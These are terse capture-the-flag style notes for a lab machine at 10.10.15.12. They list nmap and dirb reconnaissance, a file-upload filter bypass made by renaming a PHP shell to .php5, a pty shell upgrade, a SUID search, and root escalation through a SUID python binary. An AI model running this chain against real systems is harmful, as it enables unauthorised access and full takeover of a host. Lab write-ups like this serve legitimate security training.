```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.15.12 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -v -p$ports 10.10.15.12


dirb 10.10.15.12

---- Entering directory: http://10.10.15.12/panel/ ----
+ http://10.10.15.12/panel/index.php (CODE:200|SIZE:732)                                                                                                                              
                                                                                                                                                                                      
---- Entering directory: http://10.10.15.12/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

http://10.10.15.12/panel/

Use php5 extension for shell upload                                                 
cp shell.php shell.php5

10.10.15.12/uploads/

find / -name user.txt
/var/www/user.txt

python -c 'import pty;pty.spawn("/bin/sh")'

find / -perm -u=s 2>/dev/null

/usr/bin/python



python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh", "-p")'

```
